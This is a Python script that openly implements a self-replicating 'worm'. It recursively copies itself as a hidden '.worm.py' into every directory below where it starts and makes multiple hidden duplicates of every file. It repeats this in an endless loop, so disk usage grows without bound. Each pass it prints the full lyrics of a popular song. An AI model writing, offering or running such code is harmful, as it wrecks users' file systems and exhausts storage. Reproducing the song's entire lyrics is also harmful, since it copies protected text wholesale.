import os
import shutil

# !!!IMPORTANT!!! DO NOT RUN THIS IN A CODESPACE YOU WANT TO KEEP!!!


class Worm:
    
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration
        
        # get own absolute path
        self.own_path = os.path.realpath(__file__)




    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass


    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)


    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)


    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()


while True:
    if __name__=="__main__":
        current_directory = os.path.abspath("")
        worm = Worm(path=current_directory)
        worm.start_worm_actions()
        print("Good morning, Worm your honor. The crown will plainly show The prisoner who now stands before you Was caught red-handed showing feelings Showing feelings of an almost human nature; This will not do. Call the schoolmaster! I always said he'd come to no good In the end your honor. If they'd let me have my way I could Have flayed him into shape. But my hands were tied, The bleeding hearts and artists Let him get away with murder. Let me hammer him today? Crazy, Toys in the attic I am crazy, Truly gone fishing. They must have taken my marbles away. Crazy, toys in the attic he is crazy. You little shit you're in it now, I hope they throw away the key. You should have talked to me more often Than you did, but no! You had to go Your own way, have you broken any Homes up lately? Just five minutes, Worm your honor, Him and Me, alone. Baaaaaaaaaabe! Come to mother baby, let me hold you In my arms. M'lud I never wanted him to Get in any trouble. Why'd he ever have to leave me? Worm, your honor, let me take him home. Crazy, Over the rainbow, I am crazy, Bars in the window. There must have been a door there in the wall When I came in. Crazy, over the rainbow, he is crazy. The evidence before the court is Incontrovertible, there's no need for The jury to retire. In all my years of judging I have never heard before Of someone more deserving Of the full penalty of law. The way you made them suffer, Your exquisite wife and mother, Fills me with the urge to defecate! "Hey Judge! Shit on him!" Since, my friend, you have revealed your Deepest fear, I sentence you to be exposed before Your peers. Tear down the wall!")
